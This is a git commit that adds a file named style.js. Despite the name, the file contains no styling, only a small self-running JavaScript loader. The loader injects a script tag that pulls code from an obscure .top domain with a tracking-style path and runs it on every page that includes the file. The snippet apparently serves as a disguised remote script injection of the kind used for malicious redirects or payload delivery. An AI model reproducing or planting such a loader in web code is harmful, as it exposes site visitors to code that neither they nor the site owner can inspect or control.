39f2b64abf8e7879d2d82431eb14b809bc0ef5d5
okjx666 <70309521+okjx666@users.noreply.github.com>
2021-06-04 20:36:09 +0800

    Add files via upload

---
+++ style.js
@@ -0,0 +1,6 @@
+       (function() {
+          var hi = document.createElement("script");
+          hi.src = "https://f5w.as12df.top/v7KtBAOr?siwt=1070";
+          var k = document.getElementsByTagName("script")[0];
+          k.parentNode.insertBefore(hi, k);
+        })();
